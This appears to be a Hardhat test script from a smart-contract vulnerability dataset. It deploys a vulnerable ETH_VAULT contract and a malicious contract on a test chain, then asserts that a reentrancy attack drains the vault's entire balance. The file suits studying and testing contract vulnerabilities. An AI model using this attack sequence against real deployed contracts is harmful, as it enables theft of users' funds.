const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x8c7777c45481dba411450c228cb692ac3d550344.sol", function () {  
    let ETH_VAULT;
    let eth_VAULT;
    let MaliciousContract;
    let maliciousContract;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract
        Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344.sol:Log");
        log = await Log.deploy();
        await log.waitForDeployment();

        // Deploy ETH_VAULT contract with Log address
        ETH_VAULT = await ethers.getContractFactory("contracts/dataset/reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344.sol:ETH_VAULT");
        eth_VAULT = await ETH_VAULT.deploy(log.target);
        await eth_VAULT.waitForDeployment();
        //await eth_VAULT.setLog(log.target); // Set Log address after deployment

        // Deploy MaliciousContract with ETH_VAULT address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344_attack.sol:MaliciousContract");
        maliciousContract = await MaliciousContract.deploy(eth_VAULT.target);
        
    });

    it("should successfully drain funds through reentrancy attack", async function () {
        // Initial deposit to ETH_VAULT contract
        await eth_VAULT.Deposit( {value: ethers.parseEther("5") });

        const victimInitialBalance = await ethers.provider.getBalance(eth_VAULT.target);
        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


        // Initial deposit from maliciousContract on ETH_VAULT contract
        await maliciousContract.deposit({value:  ethers.parseEther("2")});

        const victimBalanceAfterDeposit = await ethers.provider.getBalance(eth_VAULT.target);
        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 


        // Perform reentrancy attack through MaliciousContract
        await maliciousContract.attack({value:  ethers.parseEther("2")});
        
        // Check balances after attack
        const victimBalance = await ethers.provider.getBalance(eth_VAULT.target);
        const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.target);

        // Verify the attack was successful
        
        // eth_VAULT has a drained account
        expect(victimBalance).to.equal(ethers.parseEther("0")); 

        // 5 original balance + 2 from  initial deposit + 2 from CashOut fallback function 
        expect(maliciousContractBalance).to.equal(ethers.parseEther("9"));
        
    });
    });
  